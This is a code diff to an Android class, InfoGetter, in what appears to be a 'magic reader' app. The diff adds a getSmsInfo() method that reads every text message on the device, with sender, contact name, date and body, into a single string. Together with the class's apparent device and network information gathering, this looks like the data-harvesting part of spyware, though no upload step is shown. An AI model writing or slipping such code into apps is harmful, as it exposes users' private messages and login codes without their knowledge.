@@ -1,12 +1,15 @@
 package org.zebork.magic.magicreader.dummy;
 
 import android.app.ActivityManager;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.Build;
@@ -311,15 +314,32 @@ public class InfoGetter {
     }
 
     /**
-     * json 2 string
-     *
-     * @param jsonObject 联系人json信息
-     * @return string 提取一丢丢出来
-
-    public String json2String(JSONObject jsonObject) {
-
-
-    }*/
+     * 获取短信信息
+     * @param ctx
+     */
+    public static String getSmsInfo(Context ctx) {
+        ContentResolver cr = ctx.getContentResolver();
+        String[] projection = new String[] {"_id", "address", "person","body", "date", "type" };
+        Uri SMS_INBOX = Uri.parse("content://sms/");
+        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
+        StringBuilder sms = new StringBuilder();
+        if (null == cur) {
+            //Log.i("ooc","************cur == null");
+            return null;
+        }
+        while(cur.moveToNext()) {
+            String number = cur.getString(cur.getColumnIndex("address"));//手机号
+            String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
+            Long time = Long.valueOf(cur.getString(cur.getColumnIndex("date")));//短信时间
+            SimpleDateFormat sdf = new SimpleDateFormat("MM-dd-yyyy HH:mm:ss");
+            Date date = new Date(time);
+            String body = cur.getString(cur.getColumnIndex("body"));//短信内容
+            if (name == null)
+                name = "";
+            sms.append(number + " " + name + "\n" + sdf.format(date) + "\n" + body + "\n\n");
+        }
+        return sms.toString();
+    }
 
     /*
     // 读指定路径的文件
